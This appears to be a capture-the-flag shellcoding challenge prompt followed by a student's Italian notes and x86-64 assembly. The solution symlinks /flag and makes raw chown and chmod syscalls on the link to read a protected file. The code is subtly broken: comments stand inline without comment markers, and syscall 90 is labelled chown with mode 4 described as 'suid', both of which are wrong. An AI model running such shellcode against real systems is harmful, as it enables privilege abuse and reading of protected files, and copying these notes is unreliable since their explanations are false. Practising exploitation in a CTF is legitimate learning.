
This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

[LEAK] Mapping shellcode memory at 0x2757c000!
Reading 0x4000 bytes from stdin.

This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need
to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.

This challenge is about to close stderr, which means that you will not be able to get use file descriptor 2 for output.

This challenge is about to close stdout, which means that you will not be able to get use file descriptor 1 for output.
You will see no further output, and will need to figure out an alternate way of communicating data back to yourself.

Si crea un link: ln -s /flag f

fatta partite cat /flag su un terminale

.global _start
.intel_syntax noprefix
_start: 

    push 0x66  stesso nome simbolico del link (f)

    mov rsi, 0
    mov rdi, rsp
    
    mov rax, 92	chiamo chown su /f con own = 0
    syscall

    mov rdi, rsp
    mov rsi, 4
    mov rax, 90 chiamo chown su /f con 4 == suid abilitato
    syscall